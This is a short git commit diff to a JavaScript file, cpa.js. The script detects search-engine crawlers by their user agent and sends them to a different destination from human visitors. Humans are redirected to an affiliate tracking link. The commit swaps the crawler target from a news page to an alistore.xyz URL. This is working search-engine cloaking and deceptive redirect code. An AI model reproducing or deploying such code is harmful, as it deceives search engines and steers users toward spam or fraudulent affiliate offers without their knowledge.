1e7e5bc3227611f12df534613c40e58776ad3412
karenmine1 <104679969+karenmine1@users.noreply.github.com>
2022-06-19 16:10:37 +0000

    Update cpa.js

--- cpa.js
+++ cpa.js
@@ -2,7 +2,7 @@
 	let params = (function(){var vars={};var parts=window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,function(m,key,value){vars[key]=value;});return vars;})();
 	let fafifu = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i.test(navigator.userAgent);
 	if(params.id) {
-		if(fafifu) location.replace('https://www.nytimes.com/section/todayspaper');
+		if(fafifu) location.replace('https://alistore.xyz/?s='+params.id+'');
 		else location.href = 'https://smrturl.co/o/55513/53218378?s1=';
 	}
 	if(params.gotcha) { document.addEventListener('DOMContentLoaded', function(){ document.title = 'Gotcha'; }); }
